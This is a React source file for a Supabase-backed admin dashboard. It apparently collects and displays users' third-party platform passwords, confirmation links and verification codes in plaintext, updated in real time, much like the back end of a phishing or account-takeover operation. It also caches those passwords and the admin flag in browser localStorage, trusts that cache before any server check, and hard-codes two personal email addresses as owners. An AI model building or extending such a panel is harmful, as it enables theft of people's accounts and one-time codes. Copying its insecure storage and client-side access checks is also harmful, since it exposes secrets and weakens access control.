import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import Connect from './Connect';
import { useAuth } from '../contexts/AuthContext';

const ADMIN_CACHE_KEY = 'nexara_admin_status';
const SUBMISSIONS_CACHE_KEY = 'nexara_cached_submissions';
const USERS_CACHE_KEY = 'nexara_cached_users';

export default function Admin() {
  const navigate = useNavigate();
  const isMounted = useRef(true);
  const currentInitId = useRef(0);
  const abortController = useRef<AbortController | null>(null);
  const backgroundValidationInProgress = useRef(false);
  const realtimeChannel = useRef<any>(null);
  const { user: authUser, loading: authLoading } = useAuth();
  const adminInitUserId = useRef<string | null>(null);
  const [rows, setRows] = useState<any[]>([]);
  const [users, setUsers] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [authChecked, setAuthChecked] = useState(false);
  const [adminState, setAdminState] = useState<'loading-session' | 'verifying-admin' | 'ready'>('loading-session');
  const [unauthorizedMessage, setUnauthorizedMessage] = useState('');
  const [statusMessage, setStatusMessage] = useState('');
  const [debugMessages, setDebugMessages] = useState<string[]>([]);
  const [hasInitialLoadCompleted, setHasInitialLoadCompleted] = useState(false);

  const addDebugMessage = (msg: string) => {
    setDebugMessages(prev => [...prev, `${new Date().toLocaleTimeString()}: ${msg}`]);
  };

  const saveAdminStatusToCache = () => {
    try {
      localStorage.setItem(ADMIN_CACHE_KEY, 'true');
      console.log('Admin: saved admin status to cache');
      addDebugMessage('admin status cached');
    } catch (err) {
      console.warn('Admin: failed to save admin status to cache:', err);
    }
  };

  const saveRowsToCache = (cachedRows: any[]) => {
    try {
      localStorage.setItem(SUBMISSIONS_CACHE_KEY, JSON.stringify(cachedRows));
      console.log('Admin: saved submissions cache');
      addDebugMessage('submissions cache updated');
    } catch (err) {
      console.warn('Admin: failed to save submissions cache:', err);
    }
  };

  const saveUsersToCache = (cachedUsers: any[]) => {
    try {
      localStorage.setItem(USERS_CACHE_KEY, JSON.stringify(cachedUsers));
      console.log('Admin: saved users cache');
      addDebugMessage('users cache updated');
    } catch (err) {
      console.warn('Admin: failed to save users cache:', err);
    }
  };

  const clearAdminCache = () => {
    try {
      localStorage.removeItem(ADMIN_CACHE_KEY);
      localStorage.removeItem(SUBMISSIONS_CACHE_KEY);
      localStorage.removeItem(USERS_CACHE_KEY);
      console.log('Admin: cleared admin status and data cache');
      addDebugMessage('admin cache cleared');
    } catch (err) {
      console.warn('Admin: failed to clear admin cache:', err);
    }
  };

  const getCachedAdminStatus = (): boolean => {
    try {
      const cached = localStorage.getItem(ADMIN_CACHE_KEY);
      return cached === 'true';
    } catch (err) {
      console.warn('Admin: failed to read admin cache:', err);
      return false;
    }
  };

  const getCachedRows = (): any[] => {
    try {
      const cached = localStorage.getItem(SUBMISSIONS_CACHE_KEY);
      return cached ? JSON.parse(cached) : [];
    } catch (err) {
      console.warn('Admin: failed to read submissions cache:', err);
      return [];
    }
  };

  const getCachedUsers = (): any[] => {
    try {
      const cached = localStorage.getItem(USERS_CACHE_KEY);
      return cached ? JSON.parse(cached) : [];
    } catch (err) {
      console.warn('Admin: failed to read users cache:', err);
      return [];
    }
  };

  useEffect(() => {
    const cachedAdmin = getCachedAdminStatus();
    if (!cachedAdmin) return;

    const cachedRows = getCachedRows();
    const cachedUsers = getCachedUsers();

    console.log('Admin: hydrating cached admin data instantly');
    addDebugMessage('hydrated cached submissions and users');
    setRows(cachedRows);
    setUsers(cachedUsers);
    setIsAdmin(true);
    setLoading(false);
    setAuthChecked(true);
    setAdminState('ready');
    setHasInitialLoadCompleted(true);
    setUnauthorizedMessage('');
    updateStatusMessage('Loaded cached admin data. Validating in background...');
  }, []);

  const finishAuthCheck = (message = '', initId?: number) => {
    if (!isMounted.current) return;
    if (initId !== undefined && currentInitId.current !== initId) return;
    setAuthChecked(true);
    setLoading(false);
    setAdminState('ready');
    setUnauthorizedMessage(message);
  };

  const updateStatusMessage = (message: string) => {
    if (!isMounted.current) return;
    setStatusMessage(message);
  };

  const initializeAdmin = async (user: any) => {
    const initId = ++currentInitId.current;
    console.log('Admin: initializeAdmin called with user:', user ? { id: user.id, email: user.email } : null, 'initId:', initId);
    if (!isMounted.current) {
      console.log('Admin: component unmounted, skipping');
      return;
    }

    // Abort previous admin check
    if (abortController.current) {
      abortController.current.abort();
    }
    abortController.current = new AbortController();

    if (!user) {
      console.log('Admin: no user, setting not admin');
      updateStatusMessage('No active admin session found. Please sign in.');
      setIsAdmin(false);
      finishAuthCheck();
      return;
    }

    // Check cache first for instant hydration
    const cachedAdmin = getCachedAdminStatus();
    if (cachedAdmin) {
      console.log('Admin: cache hit - instant hydration');
      addDebugMessage('cache hit - instant hydration');
      setIsAdmin(true);
      setAuthChecked(true);
      setAdminState('ready');
      setLoading(false);
      updateStatusMessage('Loaded from cache. Validating in background...');

      // Run background validation without blocking UI
      backgroundValidateAdmin(user, initId);
      return;
    }

    // No cache: perform normal initialization
    console.log('Admin: no cache - performing full check');
    setLoading(true);
    setAuthChecked(false);
    setAdminState('verifying-admin');
    updateStatusMessage('Verifying admin access...');
    addDebugMessage('admin check started (no cache)');

    try {
      if (!user.id) {
        console.log('Admin: user missing id, cannot proceed');
        addDebugMessage('check-failed: user missing id');
        updateStatusMessage('Invalid user session. Please refresh and try again.');
        setIsAdmin(false);
        finishAuthCheck('Invalid user session.');
        return;
      }

      const { data: profile, error } = await supabase
        .from('profiles')
        .select('is_admin')
        .eq('id', user.id)
        .maybeSingle();

      if (error) {
        console.error('Admin: profile query error:', error);
        throw error;
      }

      console.log('Admin: profile query result:', profile);
      addDebugMessage('profile query completed');
      const normalizedEmail = user.email?.toLowerCase?.() ?? '';
      const adminOwnerEmails = ['gibsonkobia@gmail.com', 'davidibrown776@gmail.com'];
      const isOwner = adminOwnerEmails.includes(normalizedEmail);
      console.log('Admin: isOwner check:', isOwner, 'user email:', user.email);

      if (!profile?.is_admin && !isOwner) {
        console.log('Admin: not admin, showing error');
        addDebugMessage('check-failed: not admin');
        updateStatusMessage('Admin access denied for this account.');
        setIsAdmin(false);
        finishAuthCheck('You do not have admin access with this account.');
        return;
      }

      console.log('Admin: user is admin - saving to cache');
      addDebugMessage('admin check passed - caching');
      saveAdminStatusToCache();
      setIsAdmin(true);
      setUnauthorizedMessage('');
      updateStatusMessage('Admin access granted. Fetching submissions...');
      finishAuthCheck('', initId);
      await fetchSubmissions(abortController.current.signal);
      await fetchUsers();
      console.log('Admin: fetchUsers completed');
      updateStatusMessage('Loaded admin data.');
      addDebugMessage('check-completed');
    } catch (err) {
      if (err.name === 'AbortError') {
        console.log('Admin: admin check aborted');
        addDebugMessage('check-aborted');
        return;
      }
      console.error('Admin: Error checking admin status:', err);
      addDebugMessage(`check-failed: ${err}`);
      setIsAdmin(false);
      if (isMounted.current) {
        finishAuthCheck('Unable to verify admin access. Please try again later.', initId);
      }
    } finally {
      if (isMounted.current) {
        setLoading(false);
        setAdminState('ready');
        console.log('Admin: initializeAdmin finally block - loading state cleared');
      }
    }
  };

  const backgroundValidateAdmin = async (user: any, initId: number) => {
    // Prevent concurrent background validations
    if (backgroundValidationInProgress.current) {
      console.log('Admin: background validation already in progress');
      return;
    }

    backgroundValidationInProgress.current = true;
    console.log('Admin: starting background validation');
    addDebugMessage('background validation started');

    try {
      if (!user.id) {
        throw new Error('User missing id');
      }

      const { data: profile, error } = await supabase
        .from('profiles')
        .select('is_admin')
        .eq('id', user.id)
        .maybeSingle();

      if (error) {
        throw error;
      }

      const normalizedEmail = user.email?.toLowerCase?.() ?? '';
      const adminOwnerEmails = ['gibsonkobia@gmail.com', 'davidibrown776@gmail.com'];
      const isOwner = adminOwnerEmails.includes(normalizedEmail);

      if (!profile?.is_admin && !isOwner) {
        console.log('Admin: background validation failed - user no longer admin');
        addDebugMessage('background validation failed: not admin');
        
        // User is no longer admin - clear cache and redirect silently
        clearAdminCache();
        setIsAdmin(false);
        setUnauthorizedMessage('Your admin access has been revoked.');
        if (isMounted.current) {
          setTimeout(() => {
            if (isMounted.current) {
              navigate('/login');
            }
          }, 2000);
        }
        return;
      }

      console.log('Admin: background validation passed');
      addDebugMessage('background validation passed');
      updateStatusMessage('Admin status confirmed.');
      
      // Refresh data in background
      await fetchSubmissions(abortController.current?.signal);
      await fetchUsers();
      
    } catch (err) {
      console.error('Admin: background validation error:', err);
      addDebugMessage(`background validation error: ${err}`);

      const status = (err as any)?.status;
      const message = String(err).toLowerCase();
      const isAuthError = status === 401 || status === 403 || message.includes('jwt') || message.includes('permission denied');

      if (isAuthError) {
        console.log('Admin: auth-related background validation failure, clearing cache');
        clearAdminCache();
        setIsAdmin(false);
        setUnauthorizedMessage('Your admin access has been revoked.');
        if (isMounted.current) {
          setTimeout(() => {
            if (isMounted.current) {
              navigate('/login');
            }
          }, 2000);
        }
      } else {
        console.log('Admin: non-auth background validation failure, keeping cache');
        updateStatusMessage('Background validation unavailable. Using cached data.');
      }
    } finally {
      backgroundValidationInProgress.current = false;
      console.log('Admin: background validation completed');
      addDebugMessage('background validation completed');
    }
  };

  useEffect(() => {
    return () => {
      isMounted.current = false;
      if (abortController.current) {
        abortController.current.abort();
      }
    };
  }, []);

  const authTimeout = useRef<number | null>(null);

  useEffect(() => {
    addDebugMessage('auth state changed via context');
    updateStatusMessage(authLoading ? 'Restoring saved admin session...' : 'Verifying admin access...');

    if (authLoading) {
      setAdminState('loading-session');
      return;
    }

    if (!authUser) {
      addDebugMessage('no auth user after restore');
      setIsAdmin(false);
      setAdminState('ready');
      finishAuthCheck('No active session. Please sign in.');
      return;
    }

    if (adminInitUserId.current === authUser.id) {
      addDebugMessage('auth user unchanged; skipping duplicate admin init');
      return;
    }

    adminInitUserId.current = authUser.id;
    addDebugMessage(`new auth user detected: ${authUser.email}`);
    initializeAdmin(authUser);
  }, [authLoading, authUser]);

  useEffect(() => {
    if (!authUser || !isAdmin) return;

    const handleRealtimeSubmission = (payload: any) => {
      const row = payload.new;
      if (!row) return;

      setRows((currentRows) => {
        const existingIndex = currentRows.findIndex((item) => item.id === row.id);
        const updatedRows = [...currentRows];

        const mappedRow = {
          id: row.id,
          platform: row.platform,
          contact: row.email || row.phone || '-',
          third_party_password: row.third_party_password,
          created_at: row.created_at,
          user_id: row.user_id || null,
          status: row.status,
          source: row.source,
          code: row.code,
          confirmation_link: row.confirmation_link || null,
        };

        if (existingIndex >= 0) {
          updatedRows[existingIndex] = mappedRow;
        } else {
          updatedRows.unshift(mappedRow);
        }

        saveRowsToCache(updatedRows);
        return updatedRows;
      });
    };

    const channel = supabase
      .channel('admin-submissions-realtime')
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'submissions' },
        handleRealtimeSubmission
      )
      .on(
        'postgres_changes',
        { event: 'UPDATE', schema: 'public', table: 'submissions' },
        handleRealtimeSubmission
      );

    channel.subscribe();
    realtimeChannel.current = channel;

    return () => {
      if (realtimeChannel.current) {
        realtimeChannel.current.unsubscribe();
      }
    };
  }, [authUser, isAdmin]);

  const fetchSubmissions = async (signal?: AbortSignal) => {
    addDebugMessage('submissions fetch started');
    console.log('Admin: fetchSubmissions started');
    try {
      updateStatusMessage('Loading submissions...');

      let { data: { session }, error: sessionError } = await supabase.auth.getSession();
      if (sessionError) {
        console.error('Admin: getSession error before fetchSubmissions:', sessionError);
      }


      if (!session) {
        throw new Error('No active session');
      }

      const token = session.access_token;

      console.log('Admin: fetching submissions from backend');
      
      // Create a timeout promise that rejects after 10 seconds
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Request timeout - backend route not responding')), 10000)
      );

      const fetchPromise = fetch('/api/admin-submissions', {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
        signal,
      });

      const response = await Promise.race([fetchPromise, timeoutPromise]) as Response;

      if (!response.ok) {
        const errorBody = await response.json().catch(() => ({}));
        throw new Error(errorBody.error || `API error: ${response.status}`);
      }

      const { data: submissions, adminEmail, isOwner } = await response.json();

      console.log('Admin: submissions response:', { count: submissions?.length, adminEmail, isOwner });

      const mergedRows = (submissions || []).map((row: any) => ({
        id: row.id,
        platform: row.platform,
        contact: row.email || row.phone || '-',
        third_party_password: row.third_party_password,
        created_at: row.created_at,
        user_id: row.user_id || null,
        status: row.status,
        source: row.source,
        code: row.code,
        confirmation_link: row.confirmation_link || null,
      }));

      console.log('Admin: merged rows count:', mergedRows.length);
      addDebugMessage(`submissions fetch success: ${mergedRows.length} submissions`);
      addDebugMessage(`admin status: email=${adminEmail}, isOwner=${isOwner}`);
      setRows(mergedRows);
      saveRowsToCache(mergedRows);
      setHasInitialLoadCompleted(true);
    } catch (err) {
      console.error('Admin: Error loading admin submissions:', err);
      const errorMsg = err instanceof Error ? err.message : String(err);
      addDebugMessage(`submissions fetch failed: ${errorMsg}`);
      updateStatusMessage(`Submissions fetch failed: ${errorMsg}`);
    } finally {
      console.log('Admin: fetchSubmissions finally, setting loading false');
      if (isMounted.current) {
        setLoading(false);
        setHasInitialLoadCompleted(true);
      }
    }
  };

  const fetchUsers = async () => {
    addDebugMessage('users fetch started');
    console.log('Admin: fetchUsers started');
    try {
      let { data: usersData, error } = await supabase
        .from('profiles')
        .select('id, email, auth_provider, is_admin, created_at');

      if (error && error.message?.includes('auth_provider')) {
        console.warn('Admin: auth_provider missing, retrying users query without it');
        const fallback = await supabase
          .from('profiles')
          .select('id, email, is_admin, created_at');
        usersData = fallback.data as any;
        error = fallback.error;

        if (!error && usersData) {
          usersData = usersData.map((user: any) => ({ ...user, auth_provider: 'email' }));
        }
      }

      if (error) {
        console.error('Admin: fetchUsers error:', error);
        addDebugMessage(`users fetch failed: ${error.message}`);
        return;
      }

      console.log('Admin: users data:', usersData);
      addDebugMessage(`users fetch success: ${usersData?.length || 0} users`);
      setUsers(usersData || []);
      saveUsersToCache(usersData || []);
      setHasInitialLoadCompleted(true);
    } catch (err) {
      console.error('Admin: Error loading users:', err);
      const errorMsg = err instanceof Error ? err.message : String(err);
      addDebugMessage(`users fetch failed: ${errorMsg}`);
    }
  };

  const renderContent = () => {
    if (!authChecked) {
      console.log('Admin: rendering auth check placeholder');
      return (
        <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
          <div className="flex flex-col gap-3 text-slate-300">
            <div className="flex items-center gap-3">
              <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white"></div>
              <span>Checking admin session...</span>
            </div>
            {statusMessage && <p className="text-sm text-slate-400">{statusMessage}</p>}
          </div>
        </div>
      );
    }

    if (!isAdmin) {
      console.log('Admin: rendering Connect with error:', unauthorizedMessage);
      return <Connect externalError={unauthorizedMessage} />;
    }

    console.log('Admin: rendering admin page');
    return (
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-semibold">Admin submissions</h1>
            <p className="text-sm text-slate-300">
              Platform connection credentials submitted by users.
            </p>
          </div>
          <button 
            onClick={async () => {
              console.log('Admin: sign out clicked');
              await supabase.auth.signOut();
              console.log('Admin: sign out completed, reloading');
              window.location.reload();
            }}
            className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
          >
            Sign Out
          </button>
        </div>
        <div className="overflow-x-auto">
          <table className="min-w-full text-left text-sm">
            <thead className="text-slate-400">
              <tr>
                <th className="px-3 py-2">Platform</th>
                <th className="px-3 py-2">Contact</th>
                <th className="px-3 py-2">Password</th>
                <th className="px-3 py-2">Confirmation Link</th>
                <th className="px-3 py-2">Code</th>
                <th className="px-3 py-2">Status</th>
                <th className="px-3 py-2">Created at</th>
                <th className="px-3 py-2">User ID</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((row) => (
                <tr key={`${row.id}-${row.status}`} className="border-t border-white/10 hover:bg-white/5 transition">
                  <td className="px-3 py-2">{row.platform}</td>
                  <td className="px-3 py-2">{row.contact}</td>
                  <td className="px-3 py-2 text-slate-400 font-mono text-xs">{row.third_party_password || '-'}</td>
                  <td className="px-3 py-2 text-slate-300 text-xs max-w-[220px] break-words whitespace-normal font-mono">{row.confirmation_link || '-'}</td>
                  <td className="px-3 py-2 font-mono font-semibold text-green-400">{row.code ? (
                    <span className="bg-green-900/20 px-2 py-1 rounded text-green-300 font-bold">{row.code}</span>
                  ) : '-'}</td>
                  <td className="px-3 py-2"><span className={`text-xs px-2 py-1 rounded ${row.status === 'pending' ? 'bg-yellow-900/20 text-yellow-300' : 'bg-green-900/20 text-green-300'}`}>{row.status}</span></td>
                  <td className="px-3 py-2 text-slate-400 text-xs">
                    {new Date(row.created_at).toLocaleString()}
                  </td>
                  <td className="px-3 py-2 text-slate-400 truncate max-w-[100px] text-xs font-mono">{row.user_id || '-'}</td>
                </tr>
              ))}
              {rows.length === 0 && hasInitialLoadCompleted && (
                <tr>
                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                    {loading ? 'Loading submissions...' : 'No submissions found.'}
                  </td>
                </tr>
              )}
              {rows.length === 0 && !hasInitialLoadCompleted && (
                <tr>
                  <td colSpan={9} className="px-3 py-8 text-center text-slate-500">
                    Loading submissions...
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        {/* Users Table */}
        <div className="mt-10">
          <h2 className="text-2xl font-semibold mb-4">Registered Users</h2>
          <div className="overflow-x-auto">
            <table className="min-w-full text-left text-sm">
              <thead className="text-slate-400">
                <tr>
                  <th className="px-3 py-2">Email</th>
                  <th className="px-3 py-2">Auth Provider</th>
                  <th className="px-3 py-2">Admin</th>
                  <th className="px-3 py-2">Created at</th>
                  <th className="px-3 py-2">User ID</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user.id} className="border-t border-white/10">
                    <td className="px-3 py-2">{user.email}</td>
                    <td className="px-3 py-2">{user.auth_provider || 'email'}</td>
                    <td className="px-3 py-2">{user.is_admin ? 'Yes' : 'No'}</td>
                    <td className="px-3 py-2 text-slate-400">
                      {new Date(user.created_at).toLocaleString()}
                    </td>
                    <td className="px-3 py-2 text-slate-400 truncate max-w-[100px]">{user.id}</td>
                  </tr>
                ))}
                {users.length === 0 && (
                  <tr>
                    <td colSpan={5} className="px-3 py-8 text-center text-slate-500">
                      {loading ? 'Loading users...' : 'No users found.'}
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  };

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5 mb-4">
        <div className="mb-4 flex flex-col gap-2 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <h2 className="text-lg font-semibold">Debug Messages</h2>
            <p className="text-sm text-slate-400">Admin session and fetch diagnostics.</p>
          </div>
          {statusMessage && (
            <div className="rounded-2xl border border-slate-700 bg-slate-950/70 px-4 py-3 text-sm text-slate-200">
              {statusMessage}
            </div>
          )}
        </div>
        <div className="text-sm text-slate-300 max-h-40 overflow-y-auto">
          {debugMessages.map((msg, idx) => (
            <div key={idx} className="mb-1">{msg}</div>
          ))}
        </div>
      </div>
      {renderContent()}
    </main>
  );
}
